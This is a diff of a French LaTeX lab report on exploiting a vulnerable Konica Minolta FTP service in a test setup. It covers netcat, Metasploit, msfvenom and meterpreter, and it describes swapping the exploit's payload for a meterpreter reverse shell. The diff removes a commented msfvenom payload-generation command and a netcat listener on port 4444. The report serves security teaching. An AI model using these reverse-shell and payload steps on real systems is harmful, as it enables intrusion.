@@ -92,7 +92,54 @@ et finalement une machine sécurisé.
 
 \section{Exploitation}
 Cette section sera consacré à l'exploitation de la machine vulnérable, et l'obtention d'un accès à distance
-sur cette dernière.
+sur cette dernière. On commencera par une bref présentation des outils utilisés pour une meilleur compréhension
+de cette section.
+    \subsection{Présentation des outils}
+    \begin{description}
+        \item[netcat :] C'est un outil utilisé en ligne de commande, et qui permet l'ouverture des connexions
+            réseau, que ce soit \emph{TCP} \cite{reseau} ou \emph{UDP} \cite{reseau}. En raison de sa polyvalence,
+            il est aussi appelé le \emph{couteau suisse} du réseau.
+
+            Pour se connecter à un serveur sur un port donnée, il faut donner à \emph{netcat} deux paramètres qui sont 
+            l'adresse du serveur et le port qu'utilise le serveur. Exemple :
+            \begin{lstlisting}[language=bash] 
+            $ netcat www.google.com 80
+            \end{lstlisting}
+
+            Dans le côté serveur, pour mettre netcat en écoute sur un port, il faut préciser deux options qui sont 
+            `\emph{-l}' pour dire à netcat d'écouter, et `\emph{-p \ul{port}}' pour préciser le port d'écoute.
+            Exemple :
+            \begin{lstlisting}
+            # netcat -l -p 80   
+            \end{lstlisting}
+
+        \item[Metasploit :] C'est un \emph{Framework} de testes de pénétrations \emph{open source} utilisé pour 
+            tester la robustesse des machines en matière de sécurité. Il est composé essentiellement de charges 
+            et d'exploits. 
+
+        \item[msfvenom :] \label{msfvenom} C'est un générateur et encodeurs de charges. Il est utile pour une utilisation plus manuelle
+            des charges, car il permet de générer ces dernières dans plusieurs format (des exécutables, pour un 
+            script python \ldots{}). 
+
+            Plusieurs paramètres sont à utiliser pour obtenir des charges plus performantes. Parmi ces options on y
+            trouve :
+            \begin{description}
+                \item[-a \ul{architecture} :] L'architecture du système dont la charge est destiné
+                    (x86 ou x64).
+                \item[--plateform \ul{plateforme} :] Le système attaqué (Windows, Mac, Linux, Android
+                \ldots{}).
+                \item[-p \ul{charge} \ul{options\_de\_la\_charge}:] La charge et les options utilisés 
+                    pour générer celle-ci.
+                \item[-e \ul{encodage} :] L'encodage utilisé pour générer la charge.
+                \item[-b \ul{mauvais\_octets} :] Les octets à éviter pendant la génération de la charge.
+                \item[-f \ul{format} :] Format de la charge (exécutable, python, perl \ldots{}).
+            \end{description}
+
+        \item[meterpreter :] \label{meterpreter}C'est une charge avancée et extensible développé par les développeurs de 
+            \emph{Metasploit}. Elle est utilisé par ce dernier pour donner un accès plus étendu et plus 
+            complet à une machine exploitable. 
+    \end{description}
+
     \subsection{La vulnérabilité}
     Le service vulnérable qui a été installé est un service \emph{ftp} manipulé par le programme 
     \emph{Konica Minolta FTP Utility}. 
@@ -113,18 +160,19 @@ sur cette dernière.
             recevoir le code malveillant pour l'exécution. Cette partie n'est pas à modifier, car elle a été développé
             après une étude approfondie du programme vulnérable.
 
-        \item[Charge :] Cette partie du script représente le code qui sera exécuté sur l'application vulnérable.
+        \item[Charge :] Cette partie du script représente le code qui sera exécuté sur l'application vulnérable. 
+            Cette partie peut être remplacé par la charge désiré par l'attaquant.
             % L'exploit téléchargé depuis ce lien \url{https://www.exploit-db.com/exploits/39215/} vient avec une charge
             % par défaut, qui est un \emph{reverse shell}.% Pour notre démonstration, on ne va pas utiliser 
             % la charge par défaut, mais on va plutôt utiliser une autre charge qui permet d'exécuter un programme 
             % beaucoup plus puissant, qui est \emph{meterpreter}. 
     \end{description}
 
-    Le script va se connecter à la machine victime sur port 21 (\autoref{execution_script_exploitation}). 
+    Le script va se connecter à la machine victime sur le port 21 (\autoref{execution_script_exploitation}). 
     La charge qu'utilise le 
     script va ordonné à la machine qu'elle donne un reverse shell en se reconnectant à la machine de l'attaquant 
-    à l'adresse 192.168.0.118 sur le port 4444. Pour intercepter ce reverse shell, et pouvoir communiquer avec
-    la machine victime, il faut ordonner à netcat\footnote{} d'écouter sur le port 4444 avec la commande ``\texttt{netcat -nlvp 4444}''.
+    sur le port 4444. Pour intercepter ce reverse shell, et pouvoir communiquer avec
+    la machine victime, il faut ordonner à netcat d'écouter sur le port 4444 (\autoref{obtention_reverse_shell}).
 
     \begin{figure}[h!]
         \centering
@@ -146,14 +194,53 @@ sur cette dernière.
         \label{exploitation_avec_charge_origine}
     \end{figure}
 
-
-    La charge utilisé par le script est un petit peu faible. Donc, nous allons générer une charge beaucoup plus
-    puissante, et qui donnera un accès plus complet sur la machine victime. Pour pouvoir générer cette charge nous
-    allons faire recours aux services de \emph{msfvenom}, qui est l'un des nombreux sous-programmes de Métasploit.
-    La commande qui nous permettra de générer la charge de meterpreter est 
-    % \verbatim{msfvenom -a x86 --platform windows -p windows/meterpreter/reverse\_tcp LHOST\=172.16.178.1 LPORT\=4444 -e x86/shikata\_ga\_nai -b ``x00x0dxx2f'' -i 3 -f python}
+    La charge par défaut de ce script est une charge un petit peu limitée, donc nous allons nous en servir 
+    de \emph{msfvenom} pour générer la charge \emph{meterpreter} (\autoref{generation_charge}) et l'utiliser 
+    dans le script d'exploitation.
+    \begin{figure}[h]
+        \centering
+        \includegraphics[width=\linewidth]{images/msfvenom.png}
+        \caption{Génération de la charge}
+        \label{generation_charge}
+    \end{figure}
 
     \subsection{Obtention d'accès}
-\section{Teste de propagation}
+    Pour la charge utilisé précédemment, il a suffit d'utiliser netcat pour intercepter la connexion et communiquer
+    avec la machine victime. Mais meterpreter exige des techniques plus poussées pour pouvoir faire cela, 
+    donc nous allons faire appel aux services de Metasploit pour accomplir cette tâche.
+    On commence par lancer Metasploit en mode console (\autoref{msfconsole}) par le biais de la commande 
+    `\emph{msfconsole}'. Après, on effectue les manipulations nécessaires (\autoref{config_metasploit})
+    pour pouvoir intercepter les réponses de meterpreter.
 
+    \begin{figure}[h!t]
+        \centering
+        \begin{subfigure}{0.9\textwidth}
+            \centering
+            \includegraphics[width=\textwidth]{images/msfconsole.png}
+            \caption{Lancement de Metasploit}
+            \label{msfconsole}
+        \end{subfigure}
+        \hfill
+        \begin{subfigure}{0.9\textwidth}
+            \centering
+            \includegraphics[width=\textwidth]{images/ecoute_msf.png}
+            \caption{Configuration de Metasploit}
+            \label{config_metasploit}
+        \end{subfigure}
+        \hfill
+        \caption{Préparation de Metasploit}
+        \label{exploitation_avec_charge_origine}
+    \end{figure}
+
+    Maintenant, il ne reste plus qu'à lancer le script d'exploitation qu'on a modifié et obtenir un accès à la 
+    machine exploité (\autoref{obtention_accees_meterpreter}).
+
+    \begin{figure}[h!t]
+        \centering
+        \includegraphics[width=\linewidth]{images/meterpreter.png}
+        \caption{Obtention de l'accès avec meterpreter}
+        \label{obtention_accees_meterpreter}
+    \end{figure}
+
+\section{Teste de propagation}
 \section{Conclusion}
